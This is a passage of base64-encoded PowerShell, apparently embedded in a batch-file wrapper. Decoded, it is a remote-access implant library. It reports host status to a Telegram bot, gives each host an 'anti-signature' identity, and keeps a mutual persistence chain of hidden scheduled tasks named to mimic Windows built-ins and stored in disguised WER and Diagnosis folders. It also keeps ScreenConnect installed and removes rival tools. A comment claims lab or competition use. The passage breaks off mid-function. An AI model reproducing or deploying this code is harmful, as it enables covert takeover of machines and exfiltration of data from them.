dCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhlYXJ0YmVh
dCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAKICAgIGlmICgk
c3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9i
ai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
ZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycg
fSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVu
bmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBHZXQtU3ZjTGlu
ZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdyeXhhS2VlcEZwKSkKICAg
ICRncnl4YVNob3J0ID0gaWYgKCRncnl4YUxpbmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0g
ZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUp
fHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25O
fHQ9JHRhc2tPay81fGI9JEJ1aWxkIgp9CgppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7CiAg
ICAkcm1tSGl0cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQogICAgJHNjTGlzdCA9
IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9IG1v
cmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkKICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIK
fQoKJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCmZ1bmN0aW9uIFNlbmQtVGco
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7CiAgICAkcGF5bG9hZCA9IEB7CiAgICAgICAg
Y2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lECiAgICAgICAgdGV4dCAgICAg
ICAgICAgICAgICAgICAgID0gJG1zZwogICAgICAgIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldyA9
ICR0cnVlCiAgICB9CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2Rl
IH0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRo
IDUKICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpz
b24pCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn
L2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYAogICAgICAgIC1NZXRob2QgUG9z
dCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0
Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQogICAgfSBjYXRjaCB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICB9Cn0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDIyCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMjI6IHN0dWNrIEdyeXhh
IC0+IG51a2UgQVJQICsgc3Bhd24gbXNpZXhlYyAvaSBERVRBQ0hFRCAoU0MgMTBzIGtpbGwgY2Fu
J3QgYWJvcnQpLgojIEwyMTogc3R1Y2sgcmVnaXN0ZXJlZCAoc3ZjK2RpciBnb25lKSAtPiAvZmEg
dGhlbiBBUlAgbnVrZSArIHNhbWUtRlAgL2k7IHJldHVybiBmaXguCiMgTDIwOiAtRGVlcCBtdXN0
IG5vdCBza2lwIGxpZ2h0IHN0YXJ0L3JlcGFpciAocmF0ZS1saW1pdCBsZWZ0IEdyeXhhIFN0b3Bw
ZWQpLgojIEwxOTogcmF0ZS1saW1pdCBuZXZlciBibG9ja3Mgd2hlbiBHcnl4YSBmdWxseSBhYnNl
bnQ7IFN0YXJ0UGVuZGluZyBrZWVwLgojIEwxODogZXh0ZXJtaW5hdGUgd2FzIEtJTExJTkcgR3J5
eGEgKG51bGwtcGF0aCBwcm9jIGtpbGwpOyBzeW5jIEZQIGJlZm9yZSBraWxsLgojIEwxNzogR3J5
eGEgcmVpbnN0YWxsIExPQ0sgd2hpbGUgYW55IG5vbi1zZXZyeiBTQyBSdW5uaW5nOyBGUCBkcmlm
dCBuZXZlciAveC4KIyBMMTY6IE5FVkVSIHJlaW5zdGFsbCBHcnl4YSB3aGVuIFJ1bm5pbmcgKHBh
bmVsIGR1cGxpY2F0ZXMpOyBUQ1AgYWR2aXNvcnkgb25seS4KIyBMMTU6IGdyeXhhLWhlYWx0aCAv
IGdyeXhhLWVuc3VyZSDigJQgOGggZGVlcCBjaGVjayAoVENQL3JlbGF5L0ZQIGRyaWZ0IHJlaW5z
dGFsbCkuCiMgTDEzOiBzY2h0YXNrcyBDcmVhdGUgdmlhIGNtZCAobGlrZSBXdWNhY2hlT3duKSwg
VFIgdW5kZXIgV2luZG93c1xUZW1wXC53dWNhY2hlCiMgICAgICAobm90IEFDTC1sb2NrZWQgUHJv
Z3JhbURhdGEgcGF0aCksIC9TVCAwMDowMCBvbiBNSU5VVEUsIG5vIGxlYWRpbmcgXC4KIyBMMTI6
IElERU5UVkVSPTcgUk9PVC1sZXZlbCB0YXNrIG5hbWVzIChuZXN0ZWQgTWljcm9zb2Z0XFdpbmRv
d3MgQWNjZXNzIERlbmllZCkuCiMgTDExOiBORVZFUiByZXVzZSByZWFsIFdpbmRvd3MgYnVpbHQt
aW4gdGFzayBuYW1lczsgVFIgb3duZXJzaGlwIGNoZWNrcy4KIyBBdXRob3JpemVkIGludGVybmFs
IGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2NvcGUgb25seS4KIyDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZAKW0NtZGxldEJpbmRpbmcoKV0KcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV0KICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3YXRjaGRvZycsICd3YXRjaGRvZy1l
bnN1cmUnLCAndGFza3MtZW5zdXJlJywgJ3N0YXRlJywgJ2lkZW50aXR5JywgJ3JlcGFpcicsICdy
ZWdpc3RlcmVkJywgJ2V4dGVybWluYXRlJywgJ2dyeXhhLWhlYWx0aCcsICdncnl4YS1lbnN1cmUn
KV0KICAgIFtzdHJpbmddJEFjdGlvbiwKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3Jh
bURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10k
TW9uUGF0aCA9ICcnLAogICAgW3N0cmluZ10kQnVpbGQgID0gJ08xNScsCiAgICBbc3RyaW5nXSRF
eHRyYSAgPSAnJywKICAgIFtzdHJpbmddJEZwICAgICA9ICcnLAogICAgW3N3aXRjaF0kRGVlcCwK
ICAgIFtzd2l0Y2hdJEZvcmNlCikKCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlD
b250aW51ZScKJGNmZ1BhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ2lkZW50aXR5LmNmZycKJElk
ZW50VmVyc2lvbiA9IDgKCiMgUm9vdC1sZXZlbCBuYW1lcyBXSVRIT1VUIGxlYWRpbmcgYmFja3Ns
YXNoIChtYXRjaGVzIHdvcmtpbmcgV3VjYWNoZU93biBzdHlsZSkuCiRQb29scyA9IEB7CiAgICBB
ID0gQCgnV2VyUXVldWVTeW5jJywnRGlhZ0hvc3RDYWNoZScsJ05ldFRyYWNlQ2FjaGUnLCdXZGlI
b3N0UHJveHknLCdQbGFTZXJ2ZXJIZWFsdGgnLCdUY3BJcENvbmZsaWN0UmVzJywnU3JDYWNoZVN5
bmMnLCdSZXNvbHV0aW9uUXVldWUnKQogICAgQiA9IEAoJ1BsYVNlcnZlckhlYWx0aCcsJ1dkaUhv
c3RQcm94eScsJ1dlclF1ZXVlU3luYycsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENhY2hlJywn
VGNwSXBDb25mbGljdFJlcycsJ1BsYVNlcnZlckRpYWcnLCdTckNhY2hlU3luYycpCiAgICBDID0g
QCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdX
ZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9zdENhY2hlJywnUGxhU2VydmVy
RGlhZycsJ1dkaUhvc3RQcm94eScpCiAgICBEID0gQCgnVGNwSXBDb25mbGljdFJlcycsJ1Jlc29s
dXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENhY2hlJywnUGxhU2VydmVyRGlh
ZycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ1dkaUhvc3RQcm94eScpCn0KJERl
ZmF1bHRzID0gW29yZGVyZWRdQHsKICAgIFRBU0tfQSA9ICdXZXJRdWV1ZVN5bmMnCiAgICBUQVNL
X0IgPSAnUGxhU2VydmVySGVhbHRoJwogICAgVEFTS19DID0gJ1dkaUhvc3RQcm94eScKICAgIFRB
U0tfRCA9ICdUY3BJcENvbmZsaWN0UmVzJwogICAgTU9fQSAgID0gJzInCiAgICBNT19CICAgPSAn
MycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsKICAgICRzID0gMEwKICAgIGZvcmVhY2ggKCRj
IGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJBcnJheSgpKSB7ICRzID0gKCRz
ICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQogICAgcmV0dXJuICRzCn0KCmZ1bmN0aW9u
IFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkKICAgIGlmIChUZXN0
LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsKICAgICAgICAgICAgaWYgKCRsaW5lIC1t
YXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZFskbWF0Y2hlc1sxXV0g
PSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRpZAp9CgpmdW5jdGlv
biBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7CiAgICBpZiAoJHRuKSB7ICYgc2NodGFz
a3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYxIHwgT3V0LU51bGwgfQp9CgpmdW5jdGlvbiBH
ZXQtVGFza1ZlcmJvc2VCbG9iKFtzdHJpbmddJHRuKSB7CiAgICBpZiAoLW5vdCAkdG4pIHsgcmV0
dXJuICcnIH0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICR0biAvRk8gTElT
VCAvViAyPiRudWxsCiAgICBpZiAoJExBU1RFWElUQ09ERSAtbmUgMCAtb3IgLW5vdCAkb3V0KSB7
IHJldHVybiAnJyB9CiAgICByZXR1cm4gKCgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0p
IC1qb2luICJgbiIpCn0KCmZ1bmN0aW9uIFRlc3QtVGFza093bnNNb24oW3N0cmluZ10kdG4sIFtz
dHJpbmddJG1hcmtlcikgewogICAgIyBUcnVlIG9ubHkgaWYgdGhlIHNjaGVkdWxlZCBhY3Rpb24g
cG9pbnRzIGF0IE9VUiBtb24vZXRsIHBhdGgg4oCUIG5vdCBhIFdpbmRvd3MgQ09NIGhhbmRsZXIu
CiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAgICBpZiAoLW5vdCAkYmxvYikg
eyByZXR1cm4gJGZhbHNlIH0KICAgIGlmICgkbWFya2VyIC1hbmQgKCRibG9iIC1tYXRjaCBbcmVn
ZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICBpZiAoJGJsb2IgLW1h
dGNoICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLmV0bGNhY2hl
XFwnKSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIEluaXRp
YWxpemUtSWRlbnRpdHkgewogICAgIyBJZGVtcG90ZW50IHdpdGhpbiBhbiBJREVOVFZFUiBnZW5l
cmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6CiAgICAjIG93bmVkIG9sZC1uYW1l
IHRhc2tzIGFyZSBkZWxldGVkOyBXaW5kb3dzIGJ1aWx0LWlucyB3aXRoIHNhbWUgbmFtZSBhcmUg
bGVmdCBhbG9uZS4KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICAkb2xkID0g
UmVhZC1JZGVudGl0eQogICAgICAgICMgTDc6IGFsc28gcmVnZW5lcmF0ZSBpZiBhbnkgVEFTS18q
IGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2FzdCBidWdzIGxlZnQgYmxhbmsgc2xvdHMpCiAgICAg
ICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAtYW5k
ICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xkWydUQVNLX0MnXSAt
YW5kICRvbGRbJ1RBU0tfRCddCiAgICAgICAgaWYgKCRzbG90c09rKSB7IHJldHVybiAkb2xkIH0K
ICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19E
JykgewogICAgICAgICAgICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtdCiAgICAgICAgICAgIGlmICgt
bm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgICAgICMgTmV2ZXIgZGVsZXRlIGEgcmVhbCBX
aW5kb3dzIHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRSIGlzIENPTS9jdXN0b20gaGFuZGxlcikuCiAg
ICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykgeyBSZW1vdmUtVGFza1F1aWV0
ICR0biB9CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkY2ZnUGF0
aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhvc3RTZWVkCiAgICAjIEw0OiB0d28gc2xvdHMg
bWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBzaGFyZSBuYW1lcykgLT4KICAg
ICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdvIHNsb3RzIGFuZCB0aGUgZmxl
ZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3YXJkIHVudGlsIHRoZSBwaWNr
IGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAjIEw2OiB0aGUgb2xkIEAoQCgnQScsICRzICUg
OCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1LjE6CiAgICAjIGJhcmUgJSBp
bnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5vdCBtb2R1bG8p
LCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xsYXBzZWQgYW5kIHRoZSBsb29wIG5ldmVyIHJh
biAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAgICAjIFRBU0tfKiBhbmQgdGhlIHdob2xlIGZs
ZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNrIG5hbWVzLgogICAgJHNlZWRz
ID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRzICUgOCkKICAgICAgICBCID0gKCgkcyArIDMp
ICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUgOCkKICAgICAgICBEID0gKCgkcyArIDcpICUg
OCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9CiAgICBmb3JlYWNoICgkbGV0dGVyIGlu
ICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRpID0gW2ludF0kc2VlZHNbJGxldHRlcl0KICAg
ICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0KICAgICAgICAkbiA9IDAKICAgICAgICB3
aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5kICRuIC1sdCA4KSB7ICRpID0g
KCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV07ICRuKysgfQogICAgICAg
IGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJUQVNLXyRsZXR0ZXIiXSB9CiAg
ICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQogICAgfQogICAgJGNmZyA9IEAoCiAgICAgICAg
IlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJUQVNLX0I9JCgkcGljay5CKSIKICAgICAgICAi
VEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRBU0tfRD0kKCRwaWNrLkQpIgogICAgICAgICJN
T19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWluIGppdHRlcgogICAgICAgICJN
T19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWluIGppdHRlcgogICAgICAgICJT
RUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9uIgogICAgKQogICAgU2V0LUNv
bnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAkY2ZnIC1Gb3JjZQogICAgcmV0dXJu
IChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBOb3JtYWxpemUtVGFza05hbWUoW3N0cmluZ10k
dG4pIHsKICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycgfQogICAgcmV0dXJuICR0bi5Ucmlt
KCkuVHJpbVN0YXJ0KCdcJykKfQoKZnVuY3Rpb24gV3JpdGUtT3duTG9nKFtzdHJpbmddJG0pIHsK
ICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJwogICAgdHJ5IHsgQWRkLUNv
bnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9IGNhdGNoIHt9Cn0KCmZ1
bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3MgewogICAgIyBNaXJyb3Igd29ya2luZyBkZXRhY2gg
KFd1Y2FjaGVPd24pOiBjbWQgc2NodGFza3MsIEJPT1QgVFIgcGF0aCwgL1NUIG9uIE1JTlVURS4K
ICAgICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHkKICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRN
b25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQogICAgJGJvb3QgPSBK
b2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdUZW1wXC53dWNhY2hlJwogICAgJGV0bERpciA9ICdD
OlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZScKICAgIGZv
cmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxEaXIpKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3Qt
UGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBh
dGggJGQgLUZvcmNlIHwgT3V0LU51bGwgfQogICAgfQogICAgJGJvb3RNb24gPSBKb2luLVBhdGgg
JGJvb3QgJ293bl9tb24uY21kJwogICAgJGJvb3RFdGwgPSBKb2luLVBhdGggJGJvb3QgJ2V0bF9t
b24uY21kJwogICAgJGV0bE1vbiA9IEpvaW4tUGF0aCAkZXRsRGlyICdldGxfbW9uLmNtZCcKICAg
IGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNb25QYXRoKSB7CiAgICAgICAgQ29weS1JdGVt
IC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RNb24gLUZvcmNlIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAk
TW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RFdGwgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGlu
YXRpb24gJGV0bE1vbiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0K
ICAgICMgQk9PVCBpcyBub3QgTG9ja0RpcidkIGJ5IG93bl9zZWN1cmUg4oCUIFRhc2sgU2NoZWR1
bGVyIGNhbiByZXNvbHZlIFRSIHRoZXJlLgogICAgJHRyTW9uID0gImNtZC5leGUgL2MgJGJvb3RN
b24iCiAgICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCIKICAgICRtb0EgPSBbc3RyaW5n
XSRpZFsnTU9fQSddOyBpZiAoLW5vdCAkbW9BKSB7ICRtb0EgPSAnMicgfQogICAgJG1vQiA9IFtz
dHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1vQiA9ICczJyB9CiAgICAkc3Qg
PSAoR2V0LURhdGUpLlRvU3RyaW5nKCdISDptbScpCiAgICAkc3BlY3MgPSBAKAogICAgICAgIEB7
IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBN
byA9ICRtb0E7IFRyID0gJHRyTW9uIH0KICAgICAgICBAeyBLZXkgPSAnVEFTS19CJzsgTWFya2Vy
ID0gJ2V0bF9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9COyBUciA9ICR0ckV0bCB9
CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQyc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0g
J09OU1RBUlQnOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tf
RCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OTE9HT04nOyBNbyA9ICcnOyBUciA9
ICR0ck1vbiB9CiAgICApCiAgICAkb2sgPSAwOyAkcmVhcm1lZCA9IDA7ICRmYWlsID0gMAogICAg
Zm9yZWFjaCAoJHNwIGluICRzcGVjcykgewogICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNrTmFt
ZSAoW3N0cmluZ10kaWRbJHNwLktleV0pCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7ICRmYWlsKys7
IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikg
eyAkb2srKzsgY29udGludWUgfQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIp
ICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAgICAgICAkYmxvYiA9IEdldC1UYXNr
